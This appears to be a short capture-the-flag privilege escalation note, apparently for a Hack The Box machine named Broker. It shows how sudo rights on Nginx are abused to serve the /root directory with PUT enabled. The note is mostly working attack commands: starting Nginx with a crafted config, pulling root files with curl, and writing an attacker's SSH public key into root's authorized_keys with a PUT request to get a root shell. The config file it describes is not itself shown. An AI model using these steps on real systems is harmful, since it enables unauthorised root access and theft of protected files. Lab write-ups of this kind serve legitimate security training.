## Privilege escalation:Nginx

If you can run Nginx on a machine as root then it is possible to use this to extract secure files and to get a ssh connection as root.

First we create the config file hacked.conf. This file is an Nginx configuration file that will start a web-server as root and exposes /root/ as the root of the website. The server also has directory browsing enabled and accepts PUT requests.
Now we start Nginx using the config file
``` bash
sudo nginx -c <file path>/hacked.conf  
```

#### Extracting files
Now we can browser (or curl) to the server on the port specified in the hacked.conf file we will be able to see all the files and take whatever we want e.g. root flags.

```
curl <target machine>:8080/root.txt
```

#### Getting a Root shell
To get a root shell we can use the a PUT request to add an ssh key to the authorized keys file and then ssh to the box as root.

First create a keypair 
```bash
ssh-keygen
``` 
And save the file as id_rsa (or whatever)
Then copy the contents of the id_rsa.pub file and use a PUT request to add them to the authorized_keys file in the root/.ssh folder
```
bash curl -X PUT http://broker.htb:8080/.ssh/authorized_keys -d '<contents of public key file>'
```
Then use the private key file to ssh onto the box as root
```
ssh root@<box> -i ./id_rsa
```





